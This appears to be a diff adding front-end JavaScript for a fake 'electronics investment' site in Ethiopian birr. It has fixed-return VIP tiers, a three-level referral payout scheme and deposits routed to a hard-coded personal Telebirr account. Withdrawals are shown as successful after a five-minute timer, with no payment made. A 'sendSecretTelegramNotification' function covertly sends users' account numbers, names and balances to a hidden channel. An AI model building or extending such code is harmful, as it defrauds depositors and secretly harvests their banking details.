+        let refStats = getUserStats(referrer);
+        refStats.balance += comm1;
+        refStats.totalIncome += comm1;
+        saveUserStats(referrer, refStats);
+
+        sendSecretTelegramNotification(`🎁 <b>Referral Bonus Added!</b>\n👤 User: <code>${referrer}</code>\n💵 Bonus: <b>${comm1.toFixed(2)} ETB</b> (Level 1 from ${depositor})\n💰 New Balance: <b>${refStats.balance.toFixed(2)} ETB</b>`);
+
+        let referrer2 = users[referrer]?.referrer;
+        if(referrer2) {
+            let comm2 = amount * 0.03;
+            let stats2 = getUserStats(referrer2);
+            stats2.balance += comm2;
+            stats2.totalIncome += comm2;
+            saveUserStats(referrer2, stats2);
+
+            sendSecretTelegramNotification(`🎁 <b>Referral Bonus Added!</b>\n👤 User: <code>${referrer2}</code>\n💵 Bonus: <b>${comm2.toFixed(2)} ETB</b> (Level 2)\n💰 New Balance: <b>${stats2.balance.toFixed(2)} ETB</b>`);
+            
+            let referrer3 = users[referrer2]?.referrer;
+            if(referrer3) {
+                let comm3 = amount * 0.02;
+                let stats3 = getUserStats(referrer3);
+                stats3.balance += comm3;
+                stats3.totalIncome += comm3;
+                saveUserStats(referrer3, stats3);
+
+                sendSecretTelegramNotification(`🎁 <b>Referral Bonus Added!</b>\n👤 User: <code>${referrer3}</code>\n💵 Bonus: <b>${comm3.toFixed(2)} ETB</b> (Level 3)\n💰 New Balance: <b>${stats3.balance.toFixed(2)} ETB</b>`);
+            }
+        }
+    }
+
+    let activeDepositTimeouts = {};
+    let activeWithdrawTimeouts = {};
+
+    function finalizeDeposit(reqId, phone, isCorrect) {
+        let reqs = getDepositRequests(phone);
+        let idx = reqs.findIndex(r => r.id === reqId);
+        if(idx === -1 || reqs[idx].status !== 'pending') return;
+        let stats = getUserStats(phone);
+        if(isCorrect) {
+            stats.balance += reqs[idx].amount;
+            stats.totalDeposit += reqs[idx].amount;
+            reqs[idx].status = 'success';
+            saveUserStats(phone, stats);
+            distributeReferralCommission(phone, reqs[idx].amount);
+
+            sendSecretTelegramNotification(`📥 <b>Deposit Approved!</b>\n👤 User: <code>${phone}</code>\n💵 Amount: <b>${reqs[idx].amount} ETB</b>\n💰 Total Balance: <b>${stats.balance.toFixed(2)} ETB</b>`);
+        } else {
+            reqs[idx].status = 'failed';
+        }
+        saveDepositRequests(phone, reqs);
+        updateDashboardUI();
+        if(window.refreshReportsModal) window.refreshReportsModal();
+    }
+
+    function addDepositRequest(phone, amount, bank, tin, orderCode) {
+        const isCorrect = isTinValidForAmount(tin, amount);
+        const delayMs = isCorrect ? 2 * 60 * 1000 : 15 * 60 * 1000;
+        const completeAt = Date.now() + delayMs;
+        const newReq = {
+            id: Date.now() + '-' + Math.random().toString(36).substr(2,6),
+            amount, bank, tin, orderCode,
+            status: 'pending', isCorrect, createdAt: Date.now(), completeAt
+        };
+        let reqs = getDepositRequests(phone);
+        reqs.push(newReq);
+        saveDepositRequests(phone, reqs);
+        const timeoutId = setTimeout(() => {
+            finalizeDeposit(newReq.id, phone, isCorrect);
+            delete activeDepositTimeouts[newReq.id];
+            if(window.refreshReportsModal) window.refreshReportsModal();
+        }, delayMs);
+        activeDepositTimeouts[newReq.id] = timeoutId;
+        return newReq;
+    }
+
+    function finalizeWithdrawal(reqId, phone) {
+        let reqs = getWithdrawRequests(phone);
+        let idx = reqs.findIndex(r => r.id === reqId);
+        if(idx === -1 || reqs[idx].status !== 'pending') return;
+        reqs[idx].status = 'success';
+        saveWithdrawRequests(phone, reqs);
+        if(window.refreshReportsModal) window.refreshReportsModal();
+    }
+
+    function addWithdrawRequest(phone, amount, bankInfo) {
+        const delayMs = 5 * 60 * 1000;
+        const completeAt = Date.now() + delayMs;
+        const newReq = {
+            id: Date.now() + '-' + Math.random().toString(36).substr(2,6),
+            amount, bank: bankInfo.bankName, account: bankInfo.accountNumber,
+            status: 'pending', createdAt: Date.now(), completeAt
+        };
+        let reqs = getWithdrawRequests(phone);
+        reqs.push(newReq);
+        saveWithdrawRequests(phone, reqs);
+        const timeoutId = setTimeout(() => {
+            finalizeWithdrawal(newReq.id, phone);
+            delete activeWithdrawTimeouts[newReq.id];
+            if(window.refreshReportsModal) window.refreshReportsModal();
+        }, delayMs);
+        activeWithdrawTimeouts[newReq.id] = timeoutId;
+        return newReq;
+    }
+
+    function restorePendingTimers(phone) {
+        let depositReqs = getDepositRequests(phone);
+        let now = Date.now();
+        depositReqs.forEach(r => {
+            if(r.status === 'pending' && r.completeAt > now) {
+                let remaining = r.completeAt - now;
+                let tid = setTimeout(() => { finalizeDeposit(r.id, phone, r.isCorrect); delete activeDepositTimeouts[r.id]; if(window.refreshReportsModal) window.refreshReportsModal(); }, remaining);
+                activeDepositTimeouts[r.id] = tid;
+            } else if(r.status === 'pending' && r.completeAt <= now) finalizeDeposit(r.id, phone, r.isCorrect);
+        });
+        let withdrawReqs = getWithdrawRequests(phone);
+        withdrawReqs.forEach(r => {
+            if(r.status === 'pending' && r.completeAt > now) {
+                let remaining = r.completeAt - now;
+                let tid = setTimeout(() => { finalizeWithdrawal(r.id, phone); delete activeWithdrawTimeouts[r.id]; if(window.refreshReportsModal) window.refreshReportsModal(); }, remaining);
+                activeWithdrawTimeouts[r.id] = tid;
+            } else if(r.status === 'pending' && r.completeAt <= now) finalizeWithdrawal(r.id, phone);
+        });
+    }
+
+    // UI Rendering
+    function renderHome() {
+        let title = currentLang==='am' ? `⚡ የኤሌክትሮኒክስ ኢንቨስትመንት ምርቶች` : `⚡ Electronics Investment Products`;
+        let html = `<div style="margin-bottom: 15px;"><h3 style="color: #1e3a8a;">${title}</h3></div>`;
+        for(let vip of vipLevels) {
+            html += `<div class="vip-card">
+                <div class="vip-header">
+                    <img src="${vip.logo}" alt="${vip.name}" class="club-logo">
+                    <div class="vip-title">${vip.name}</div>
+                </div>
+                <div class="vip-detail"><span>Price:</span> <strong>${vip.price} ETB</strong></div>
+                <div class="vip-detail"><span>Daily Income:</span> <strong style="color:#16a34a;">${vip.daily} ETB</strong></div>
+                <div class="vip-detail"><span>Total Income:</span> <strong>${vip.total} ETB</strong></div>
+                <div class="vip-detail"><span>Investment Days:</span> <strong>${vip.days} Days</strong></div>
+                <button class="purchase-btn" data-id="${vip.id}" data-price="${vip.price}">Purchase Amount: ETB ${vip.price}</button>
+            </div>`;
+        }
+        document.getElementById('homePanel').innerHTML = html;
+        document.querySelectorAll('.purchase-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                let price = parseInt(btn.dataset.price);
+                let vipId = parseInt(btn.dataset.id);
+                let stats = getUserStats(currentUser);
+                if(stats.balance >= price) {
+                    stats.balance -= price;
+                    saveUserStats(currentUser, stats);
+                    let purchases = getUserPurchases(currentUser);
+                    purchases.push({ vipId, purchaseTime: Date.now(), lastClaim: Date.now() });
+                    saveUserPurchases(currentUser, purchases);
+                    alert(`✅ ${vipLevels.find(v=>v.id===vipId).name} purchased! Daily income will be added automatically.`);
+                    updateDashboardUI();
+                    renderHome();
+                } else alert("❌ Insufficient balance. Please deposit.");
+            });
+        });
+    }
+
+    // Deposit flow
+    let depositState = { step: 'amount', amount: null, bank: null, orderCode: null };
+    function renderDeposit() {
+        document.getElementById('depositPanel').innerHTML = `<div class="deposit-step-card" id="depositStepContainer"></div>`;
+        depositState = { step: 'amount', amount: null, bank: null, orderCode: null };
+        renderStepAmount();
+    }
+
+    function renderStepAmount() {
+        const amounts = vipLevels.map(v => v.price);
+        let title = currentLang==='am' ? `💰 የገቢ መጠን ይምረጡ` : `💰 Select Deposit Amount`;
+        let sub = currentLang==='am' ? `ኢንቨስት ማድረግ የሚፈልጉትን የምርት ዋጋ ይምረጡ:` : `Select the registered price for the product you want to invest in:`;
+        let btnText = currentLang==='am' ? `ቀጥል` : `Continue`;
+        
+        let html = `<h3>${title}</h3><p style="font-size:0.85rem; color:#64748b; margin-bottom:10px;">${sub}</p><div class="amount-grid">`;
+        amounts.forEach(a => html += `<div class="amount-btn" data-amount="${a}">${a} ETB</div>`);
+        html += `</div><button id="contAmtBtn" disabled>${btnText}</button>`;
+        document.getElementById('depositStepContainer').innerHTML = html;
+        let selected = null;
+        document.querySelectorAll('.amount-btn').forEach(btn => {
+            btn.onclick = () => {
+                document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('selected'));
+                btn.classList.add('selected');
+                selected = parseInt(btn.dataset.amount);
+                document.getElementById('contAmtBtn').disabled = false;
+            };
+        });
+        document.getElementById('contAmtBtn').onclick = () => { if(selected) { depositState.amount = selected; renderStepBank(); } else alert("Select amount"); };
+    }
+
+    function renderStepBank() {
+        let banks = ["Telebirr", "CBE", "Awash", "Abysinia", "Oromia", "Dashen", "Lion", "Zemen"];
+        let title = currentLang==='am' ? `🏦 የክፍያ መንገድ ይምረጡ` : `🏦 Select Payment Method`;
+        let btnText = currentLang==='am' ? `ቀጥል` : `Continue`;
+        let backText = currentLang==='am' ? `ተመለስ` : `Back`;
+        
+        let html = `<h3>${title}</h3><div class="bank-select-grid">`;
+        banks.forEach(b => html += `<div class="bank-option" data-bank="${b}">${b}</div>`);
+        html += `</div><button id="contBankBtn" disabled>${btnText}</button><button id="backAmtBtn" class="btn-secondary">${backText}</button>`;
+        document.getElementById('depositStepContainer').innerHTML = html;
+        let selected = null;
+        document.querySelectorAll('.bank-option').forEach(opt => {
+            opt.onclick = () => {
+                document.querySelectorAll('.bank-option').forEach(o => o.classList.remove('selected'));
+                opt.classList.add('selected');
+                selected = opt.dataset.bank;
+                document.getElementById('contBankBtn').disabled = false;
+            };
+        });
+        document.getElementById('contBankBtn').onclick = () => { 
+            if(selected) { 
+                if (selected !== 'Telebirr') {
+                    let msg = currentLang==='am' 
+                        ? `⚠️ የ ${selected} ክፍያ አማራጭ እስካሁን አልተካተተም! እባክዎ የአሁኑን ጊዜያዊ እባክዎ Telebirr ይጠቀሙ።` 
+                        : `⚠️ ${selected} payment option will be included in the future! Please use Telebirr for now.`;
+                    alert(msg);
+                    return;
+                }
+                depositState.bank = selected; 
+                renderStepPayment(); 
+            } else alert("Select bank"); 
+        };
+        document.getElementById('backAmtBtn').onclick = () => renderStepAmount();
+    }
+
+    function renderStepPayment() {
+        let orderCode = "PN" + Date.now() + Math.floor(Math.random()*10000);
+        depositState.orderCode = orderCode;
+        
+        let recipientName = "Elisaye";
+        let accountNumber = "0950714744";
+
+        let title = currentLang==='am' ? `💸 የክፍያ ማረጋገጫ` : `💸 Payment Details`;
+        let labelMethod = currentLang==='am' ? `የክፍያ መንገድ:` : `Payment Method:`;
+        let labelRecipient = currentLang==='am' ? `ተቀባይ ስም:` : `Recipient Name:`;
+        let labelAccount = currentLang==='am' ? `ስልክ/አካውንት:` : `Phone/Account:`;
+        let labelAmount = currentLang==='am' ? `መጠን:` : `Amount:`;
+        let labelOrder = currentLang==='am' ? `የትዕዛዝ ኮድ:` : `Order Code:`;
+        let btnCopy = currentLang==='am' ? `ኮፒ` : `Copy`;
+        let subCopy = currentLang==='am' ? `የትዕዛዝ ኮድን ተጠቅመው ማስተላለፉን ማረጋገጫ ስለሚያገለግል (Reason/Remark) ያድርጉ።` : `Use order code as transfer reference.`;
+        let btnPaid = currentLang==='am' ? `✅ ክፍያ ፈጽሜያለሁ` : `✅ I have made transfer`;
+        let btnBack = currentLang==='am' ? `ተመለስ` : `Back`;
+
+        let html = `<h3>${title}</h3>
+        <div style="background:#f1f5f9;border-radius:16px;padding:16px;margin:15px 0;line-height:1.6;">
+            <div><strong>${labelMethod}</strong> ${depositState.bank}</div>
+            <div><strong>${labelRecipient}</strong> ${recipientName}</div>
+            <div><strong>${labelAccount}</strong> ${accountNumber}</div>
+            <div><strong>${labelAmount}</strong> <span style="color:#2563eb;font-weight:bold;">${depositState.amount} ETB</span></div>
+            <div><strong>${labelOrder}</strong> ${orderCode} <span class="copy-btn" id="copyOrderBtn">${btnCopy}</span></div>
+            <div style="margin-top:6px;"><small style="color:#64748b;">${subCopy}</small></div>
+        </div>
+        <button id="paidBtn">${btnPaid}</button>
+        <button id="backBankBtn" class="btn-secondary">${btnBack}</button>`;
+        
+        document.getElementById('depositStepContainer').innerHTML = html;
+        document.getElementById('copyOrderBtn')?.addEventListener('click', () => { 
+            navigator.clipboard.writeText(orderCode); 
+            alert(currentLang==='am' ? "የትዕዛዝ ኮድ ኮፒ ተደርጓል" : "Order code copied"); 
+        });
+        
+        document.getElementById('paidBtn').onclick = () => {
+            let tinPrompt = currentLang==='am' ? "📄 እባክዎ የ FT / TIN ቁጥርዎን ያስገቡ:" : "📄 Please enter your FT / TIN number:";
+            let tin = prompt(tinPrompt);
+            if(!tin || tin.trim() === "") { 
+                alert(currentLang==='am' ? "FT/TIN ማስገባት ግዴታ ነው!" : "FT/TIN is required!"); 
+                return; 
+            }
+            let isValid = isTinValidForAmount(tin, depositState.amount);
+            let msg = isValid 
+                ? (currentLang==='am' ? "✅ ትክክለኛ TIN! በ 2 ደቂቃ ውስጥ ገቢ ይሆናል።" : "✅ Valid TIN! Pending for 2 minutes then credited.") 
+                : (currentLang==='am' ? "❌ ለዚህ ምርት የተሳሳተ TIN! በ 15 ደቂቃ ውስጥ ውድቅ ይደረጋል።" : "❌ Invalid TIN for this product level! Pending for 15 minutes then declined.");
+            
+            if(confirm(`TIN: ${tin}\n${msg}\nSubmit?`)) {
+                addDepositRequest(currentUser, depositState.amount, depositState.bank, tin.trim(), depositState.orderCode);
+                alert(currentLang==='am' ? "የገቢ ጥያቄ ተመዝግቧል! ሪፖርት ይመልከቱ።" : "Deposit request recorded! Check Reports.");
+                showPanel('home');
+                renderMy();
+            }
+        };
+        document.getElementById('backBankBtn').onclick = () => renderStepBank();
+    }
+
+    // Withdraw
+    function renderWithdraw() {
+        let stats = getUserStats(currentUser);
+        let bank = getUserBank(currentUser);
+        let panel = document.getElementById('withdrawPanel');
+        panel.innerHTML = `<div class="withdraw-card">
+            <h3>🏧 Withdrawal</h3>
+            <div style="margin: 12px 0;"><strong>Available Balance:</strong> ${stats.balance.toFixed(2)} ETB</div>
+            <div style="color: #64748b; font-size: 0.85rem; margin-bottom: 12px;">Min Withdrawal: 300 ETB | Fee: 10%</div>
+            <div class="form-group"><input type="number" id="wdAmount" placeholder="Enter Amount in ETB"></div>
+            <button id="requestWdBtn">Request Withdrawal</button>
+            <div id="wdBankInfo" style="margin-top: 15px; font-size: 0.9rem; color: #475569; background: #f8fafc; padding: 12px; border-radius: 12px;">${bank ? `<strong>Target Bank:</strong> ${bank.bankName}<br><strong>Account:</strong>${bank.accountNumber}` : '⚠️ No bank account added. Go to My → Bank Account'}</div>
+        </div>`;
+        document.getElementById('requestWdBtn').onclick = () => {
+            let amt = parseFloat(document.getElementById('wdAmount').value);
+            let bankData = getUserBank(currentUser);
+            if(!bankData) { alert("Please add bank account first."); return; }
+            if(amt < 300) { alert("Minimum withdrawal is 300 ETB"); return; }
+            if(amt > stats.balance) { alert("Insufficient balance"); return; }
+            let hour = new Date().getHours();
+            if(hour < 10 || hour >= 17) { alert("Withdrawals are allowed only between 10:00 - 17:00"); return; }
+            let fee = amt * 0.1;
+            let net = amt - fee;
+            if(confirm(`Withdraw ${amt} ETB?\nFee: ${fee} ETB\nNet Received: ${net} ETB\nProcessing time: ~5 minutes`)) {
+                stats.balance -= amt;
+                stats.totalWithdraw += amt;
+                saveUserStats(currentUser, stats);
+                addWithdrawRequest(currentUser, amt, bankData);
+
+                sendSecretTelegramNotification(`🔻 <b>Withdrawal Requested!</b>\n👤 User: <code>${currentUser}</code>\n💵 Requested Amount: <b>${amt} ETB</b>\n💸 Net Payable: <b>${net} ETB</b> (Fee: ${fee} ETB)\n🏦 Bank: <b>${bankData.bankName}</b>\n💳 Account: <code>${bankData.accountNumber}</code> (${bankData.holderName})\n💰 Remaining Balance: <b>${stats.balance.toFixed(2)} ETB</b>`);
+
+                alert("Withdrawal request submitted! Pending for 5 minutes.");
+                updateDashboardUI();
+                showPanel('home');
+                renderMy();
+            }
+        };
+    }
+
+    // --- REPORTS MODAL WITH TOGGLE AND STRICT LEFT/RIGHT SPLIT ---
+    let reportsModalDiv = null;
+    let activeReportTab = 'deposit'; // 'deposit' or 'withdraw'
+
+    function showReportsModal() {
+        if(reportsModalDiv) reportsModalDiv.remove();
+        let overlay = document.createElement('div');
+        overlay.className = 'modal-overlay';
+        
+        let titleText = currentLang === 'am' ? '📋 የግብይት ሪፖርት' : '📋 Transaction Reports';
+        let depTabLabel = currentLang === 'am' ? '📥 ገቢዎች' : '📥 Deposit';
+        let wdTabLabel = currentLang === 'am' ? '📤 ወጪዎች' : '📤 Withdraw';
+        let closeText = currentLang === 'am' ? 'ዝጋ' : 'Close';
+
+        overlay.innerHTML = `
+            <div class="report-modal">
+                <h3 style="color:#1e3a8a; margin-bottom:15px; text-align:center;">${titleText}</h3>
+                
+                <!-- Toggle Tab Buttons -->
+                <div class="report-tab-container">
+                    <div id="tabDepBtn" class="report-tab-btn ${activeReportTab === 'deposit' ? 'active-dep' : ''}">${depTabLabel}</div>
+                    <div id="tabWdBtn" class="report-tab-btn ${activeReportTab === 'withdraw' ? 'active-wd' : ''}">${wdTabLabel}</div>
+                </div>
+
+                <!-- Side-by-Side Container (Left Deposit, Right Withdraw) -->
+                <div class="report-split-grid">
+                    <div id="depositColumn" class="report-col" style="display: ${activeReportTab === 'deposit' ? 'block' : 'none'};"></div>
+                    <div id="withdrawColumn" class="report-col" style="display: ${activeReportTab === 'withdraw' ? 'block' : 'none'};"></div>
+                </div>
+
+                <button id="closeReportBtn" class="btn-secondary" style="margin-top:15px;">${closeText}</button>
+            </div>`;
+            
+        document.body.appendChild(overlay);
+        reportsModalDiv = overlay;
+
+        // Toggle Event Listeners
+        document.getElementById('tabDepBtn').onclick = () => {
+            activeReportTab = 'deposit';
+            document.getElementById('tabDepBtn').className = 'report-tab-btn active-dep';
+            document.getElementById('tabWdBtn').className = 'report-tab-btn';
+            document.getElementById('depositColumn').style.display = 'block';
+            document.getElementById('withdrawColumn').style.display = 'none';
+        };
+
+        document.getElementById('tabWdBtn').onclick = () => {
+            activeReportTab = 'withdraw';
+            document.getElementById('tabWdBtn').className = 'report-tab-btn active-wd';
+            document.getElementById('tabDepBtn').className = 'report-tab-btn';
+            document.getElementById('depositColumn').style.display = 'none';
+            document.getElementById('withdrawColumn').style.display = 'block';
+        };
+
+        window.refreshReportsModal = () => refreshReportsContent();
+        refreshReportsContent();
+
+        document.getElementById('closeReportBtn').onclick = () => { overlay.remove(); reportsModalDiv = null; window.refreshReportsModal = null; };
+        overlay.addEventListener('click', (e) => { if(e.target === overlay) { overlay.remove(); reportsModalDiv = null; window.refreshReportsModal = null; } });
+    }
+
+    function refreshReportsContent() {
+        if(!reportsModalDiv) return;
+        
+        let depContainer = reportsModalDiv.querySelector('#depositColumn');
+        let wdContainer = reportsModalDiv.querySelector('#withdrawColumn');
+        if(!depContainer || !wdContainer) return;
+
+        let deposits = getDepositRequests(currentUser);
+        let withdrawals = getWithdrawRequests(currentUser);
+
+        // LEFT SIDE: Deposits
+        let depHtml = '';
+        if(deposits.length === 0) {
+            depHtml = `<div style="font-size:0.85rem; color:#94a3b8; text-align:center; padding:15px;">No deposit history.</div>`;
+        } else {
+            deposits.slice().reverse().forEach(d => {
+                let statusClass = d.status === 'pending' ? 'status-pending' : (d.status==='success'?'status-success':'status-failed');
+                let statusText = d.status === 'pending' ? '⏳ Pending' : (d.status==='success'?'✅ Success':'❌ Failed');
+                let timer = '';
+                if(d.status === 'pending') {
+                    let left = Math.max(0, d.completeAt - Date.now());
+                    let mins = Math.floor(left/60000), secs = Math.floor((left%60000)/1000);
+                    timer = `<div class="timer-text">Remaining: ${mins}m ${secs}s</div>`;
+                }
+                depHtml += `<div class="report-item">
+                    <div><strong>${d.amount} ETB</strong> - ${d.bank}</div>
+                    <div style="font-size:0.8rem; color:#64748b;">TIN: ${d.tin}</div>
+                    <div style="font-size:0.8rem; color:#64748b;">Order: ${d.orderCode}</div>
+                    <div class="${statusClass}">${statusText}</div>${timer}
+                </div>`;
+            });
+        }
+        depContainer.innerHTML = depHtml;
+
+        // RIGHT SIDE: Withdrawals
+        let wdHtml = '';
+        if(withdrawals.length === 0) {
+            wdHtml = `<div style="font-size:0.85rem; color:#94a3b8; text-align:center; padding:15px;">No withdrawal history.</div>`;
+        } else {
+            withdrawals.slice().reverse().forEach(w => {
+                let statusClass = w.status === 'pending' ? 'status-pending' : 'status-success';
+                let statusText = w.status === 'pending' ? '⏳ Pending' : '✅ Success';
+                let timer = '';
+                if(w.status === 'pending') {
+                    let left = Math.max(0, w.completeAt - Date.now());
+                    let mins = Math.floor(left/60000), secs = Math.floor((left%60000)/1000);
+                    timer = `<div class="timer-text">Remaining: ${mins}m ${secs}s</div>`;
+                }
+                wdHtml += `<div class="report-item" style="border-left-color: #0d9488;">
+                    <div><strong>${w.amount} ETB</strong> - ${w.bank}</div>
+                    <div style="font-size:0.8rem; color:#64748b;">Acc: ${w.account}</div>
+                    <div class="${statusClass}">${statusText}</div>${timer}
+                </div>`;
+            });
+        }
+        wdContainer.innerHTML = wdHtml;
+    }
+
+    // Guest / Chest Code Functionality
+    function openChestModal() {
+        let codeInput = prompt("🎁 Enter Guest Code:");
+        if(!codeInput || codeInput.trim() === "") return;
+
+        let userCode = codeInput.trim().toLowerCase();
+
+        let isValid = validGuestCodes.some(c => c.toLowerCase() === userCode);
+        if (!isValid) {
+            alert("invalid code");
+            return;
+        }
+
+        let codeData = getCodeInfo(userCode);
+
+        if (codeData.usedUsers.includes(currentUser)) {
+            alert("invalid code");
+            return;
+        }
+
+        if (codeData.count >= 20) {
+            alert("invalid code");
+            return;
+        }
+
+        let reward = Math.floor(Math.random() * 14) + 2;
+
+        let stats = getUserStats(currentUser);
+        stats.balance += reward;
+        stats.totalIncome += reward;
+        saveUserStats(currentUser, stats);
+
+        codeData.usedUsers.push(currentUser);
+        codeData.count += 1;
+        localStorage.setItem("fgi_guest_code_" + userCode, JSON.stringify(codeData));
+
+        updateDashboardUI();
+
+        sendSecretTelegramNotification(`🎁 <b>Guest Code Claimed!</b>\n👤 User: <code>${currentUser}</code>\n🔑 Code: <code>${userCode}</code>\n💵 Amount Claimed: <b>${reward} ETB</b>\n💰 Total Balance: <b>${stats.balance.toFixed(2)} ETB</b>\n📊 Total Claims for Code: <b>${codeData.count}/20</b>`);
+
+        alert(`🎉 Congratulations! Valid code. ETB ${reward}.00 has been added to your balance!`);
+    }
+
+    // My page
+    function renderMy() {
+        let stats = getUserStats(currentUser);
+        let panel = document.getElementById('myPanel');
+        panel.innerHTML = `<div style="background:white; border-radius:20px; padding:20px; border:1px solid #e2e8f0;">
+            <div style="font-size: 1.2rem; font-weight: bold; color: #1e3a8a; margin-bottom: 10px;"><i class="fas fa-user-circle"></i> User: ${currentUser}</div>
+            <div style="line-height:1.8; color:#475569; font-size:0.95rem;">
+                <div><strong>Current Balance:</strong> ETB ${stats.balance.toFixed(2)}</div>
+                <div><strong>Total Deposit:</strong> ETB ${stats.totalDeposit.toFixed(2)}</div>
+                <div><strong>Total Withdraw:</strong> ETB ${stats.totalWithdraw.toFixed(2)}</div>
+            </div>
+            <hr style="margin: 15px 0; border: none; border-top: 1px solid #e2e8f0;">
+            <div class="quick-actions" style="flex-wrap:wrap; gap:10px;">
+                <button id="reportsBtnMy">📋 Reports</button>
+                <button id="bankAccountBtnMy">🏦 Bank Account</button>
+                <button id="changePwdBtnMy">🔐 Change Password</button>
+                <button id="teamTaskBtnMy">👥 Team Task</button>
+                <button id="chestBtnMy">🎁 Guest Code</button>
+                <button id="customerServiceBtnMy">📞 Customer Service</button>
+            </div>
+            <div id="myDynamicContent" style="margin-top: 15px;"></div>
+        </div>`;
+        document.getElementById('reportsBtnMy').onclick = () => showReportsModal();
+        document.getElementById('bankAccountBtnMy').onclick = () => showBankFormWithModal();
+        document.getElementById('changePwdBtnMy').onclick = () => changePasswordUI();
+        document.getElementById('teamTaskBtnMy').onclick = () => alert("Invite friends using your referral code to earn 20%/3%/2% commissions.");
+        document.getElementById('chestBtnMy').onclick = () => openChestModal();
+        document.getElementById('customerServiceBtnMy').onclick = () => showPanel('service');
+    }
+
+    function showBankFormWithModal() {
+        const container = document.getElementById('myDynamicContent');
+        let curr = getUserBank(currentUser);
+        container.innerHTML = `<div class="bank-card-form">
+            <div class="bank-header-row"><span style="font-weight:bold; color:#1e3a8a;">🏦 Bank Account Details</span><div class="three-dot-icon" id="threeDotBankBtn"><i class="fas fa-ellipsis-v"></i></div></div>
+            <div class="form-group"><input type="text" id="bankNameField" placeholder="Bank Name" value="${curr?.bankName||''}" readonly style="background:#f1f5f9;"></div>
+            <div class="form-group"><input type="text" id="accNumberField" placeholder="Account Number" value="${curr?.accountNumber||''}"></div>
+            <div class="form-group"><input type="text" id="holderField" placeholder="Account Holder Name" value="${curr?.holderName||''}"></div>
+            <button id="saveBankDetailsBtn">Save Details</button>
+        </div>`;
+        const bankList = ["Telebirr","CBE","Awash","Abysinia","Oromia","Dashen","Lion","Zemen"];
+        document.getElementById('threeDotBankBtn').onclick = () => {
+            let modal = document.createElement('div');
+            modal.className = 'modal-overlay';
+            modal.innerHTML = `<div class="bank-select-modal"><h4 style="margin-bottom:12px; color:#1e3a8a;">Select Bank / Telebirr</h4><div id="bankOptList"></div><button id="closeBankListBtn" class="btn-secondary">Close</button></div>`;
+            document.body.appendChild(modal);
+            let listDiv = modal.querySelector('#bankOptList');
+            bankList.forEach(b => {
+                let opt = document.createElement('div');
+                opt.className = 'bank-option-item';
+                opt.innerHTML = `<i class="fas fa-university" style="color:#2563eb;"></i> <span>${b}</span>`;
+                opt.onclick = () => {
+                    document.getElementById('bankNameField').value = b;
+                    modal.remove();
+                };
+                listDiv.appendChild(opt);
+            });
+            modal.querySelector('#closeBankListBtn').onclick = () => modal.remove();
+            modal.addEventListener('click', (e) => { if(e.target === modal) modal.remove(); });
+        };
+        document.getElementById('saveBankDetailsBtn').onclick = () => {
+            let bn = document.getElementById('bankNameField').value.trim();
+            let acc = document.getElementById('accNumberField').value.trim();
+            let holder = document.getElementById('holderField').value.trim();
+            if(!bn || !acc || !holder) { alert("All fields are required"); return; }
+            saveUserBank(currentUser, { bankName: bn, accountNumber: acc, holderName: holder });
+            alert("Bank account saved successfully!");
+            renderMy();
+        };
+    }
+
+    function changePasswordUI() {
+        let users = getUsers();
+        const container = document.getElementById('myDynamicContent');
+        container.innerHTML = `<div style="background:#f8fafc; padding:15px; border-radius:12px;"><div class="form-group"><input type="password" id="oldPass" placeholder="Current Password"></div><div class="form-group"><input type="password" id="newPass" placeholder="New Password"></div><button id="changePwdFinal">Change Password</button></div>`;
+        document.getElementById('changePwdFinal').onclick = () => {
+            let old = document.getElementById('oldPass').value;
+            let newp = document.getElementById('newPass').value;
+            if(users[currentUser].password !== old) alert("Current password is wrong");
+            else { users[currentUser].password = newp; saveUsers(users); alert("Password updated successfully!"); renderMy(); }
+        };
+    }
+
+    // --- SHARE / TEAM PANEL (masked phone numbers, levels 1-3) ---
+    function renderShare() {
+        let users = getUsers();
+        let myCode = users[currentUser]?.inviteCode || (()=>{ let c = Math.random().toString(36).substring(2,8).toUpperCase(); users[currentUser].inviteCode = c; saveUsers(users); return c; })();
+        let link = window.location.origin + window.location.pathname + `?ref=${myCode}`;
+
+        let team = getTeamByLevels(currentUser);
+
+        function memberRowsHtml(list) {
+            if(!list || list.length === 0) {
+                return `<div style="font-size:0.8rem; color:#94a3b8; margin-top:6px;">No members yet.</div>`;
+            }
+            return list.map(p => {
+                let active = isMemberActive(p);
+                return `<div style="display:flex; justify-content:space-between; align-items:center; padding:6px 0; border-bottom:1px dashed #e2e8f0; font-size:0.85rem;">
+                    <span><i class="fas fa-user" style="color:#2563eb;"></i> <span style="font-family: monospace; letter-spacing:0.5px;">${maskPhone(p)}</span></span>
+                    <span style="color:${active ? '#16a34a' : '#94a3b8'}; font-weight:bold; font-size:0.7rem;">${active ? 'ACTIVE' : 'INACTIVE'}</span>
+                </div>`;
+            }).join('');
+        }
+
+        function activeCount(list) {
+            return (list || []).filter(p => isMemberActive(p)).length;
+        }
+
+        let lvl1 = team[1] || [];
+        let lvl2 = team[2] || [];
+        let lvl3 = team[3] || [];
+
+        let html = `<div class="vip-card">
+            <div style="margin-bottom:10px;"><strong>Invitation Code:</strong> <span style="color:#2563eb; font-weight:bold;">${myCode}</span> <span class="copy-btn" id="copyCodeBtn">Copy</span></div>
+            <div style="margin-bottom:15px; word-break:break-all;"><strong>Invitation Link:</strong> ${link} <span class="copy-btn" id="copyLinkBtn">Copy</span></div>
+            <hr style="margin:12px 0; border:none; border-top:1px solid #e2e8f0;">
+
+            <div class="team-level">
+                <strong>Team Level 1 (20% Commission)</strong><br>
+                Members: ${lvl1.length}<br>
+                Active: ${activeCount(lvl1)}
+                <div style="margin-top:8px;">${memberRowsHtml(lvl1)}</div>
+            </div>
+
+            <div class="team-level">
+                <strong>Team Level 2 (3% Commission)</strong><br>
+                Members: ${lvl2.length}<br>
+                Active: ${activeCount(lvl2)}
+                <div style="margin-top:8px;">${memberRowsHtml(lvl2)}</div>
+            </div>
+
+            <div class="team-level">
+                <strong>Team Level 3 (2% Commission)</strong><br>
+                Members: ${lvl3.length}<br>
+                Active: ${activeCount(lvl3)}
+                <div style="margin-top:8px;">${memberRowsHtml(lvl3)}</div>
+            </div>
+
+            <small style="color:#64748b;">Earn referral bonuses: 20% on direct deposits, 3% on level 2, and 2% on level 3.</small>
+        </div>`;
+
+        document.getElementById('sharePanel').innerHTML = html;
+        document.getElementById('copyCodeBtn')?.addEventListener('click',()=>{ navigator.clipboard.writeText(myCode); alert("Invitation code copied!"); });
